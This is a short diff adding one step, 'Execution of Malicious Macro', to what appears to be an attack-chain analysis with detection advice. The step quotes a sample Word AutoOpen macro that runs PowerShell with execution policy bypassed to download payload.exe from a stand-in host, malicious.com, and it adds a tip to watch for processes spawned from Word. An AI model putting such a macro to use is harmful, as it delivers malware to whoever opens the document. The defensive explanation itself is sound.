@@ -1,0 +1,7 @@
+
+3. **Execution of Malicious Macro**
+   - Application: Microsoft Word
+   - User Action: The macro executes upon enabling content.
+   - Key Artifacts: Macro code that downloads a payload from a remote server, e.g., `Sub AutoOpen() : CreateObject("WScript.Shell").Run "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Users\User\Downloads\payload.exe" : End Sub`.
+   - Detection: Monitor for processes spawned from Word that execute scripts or download files.
+
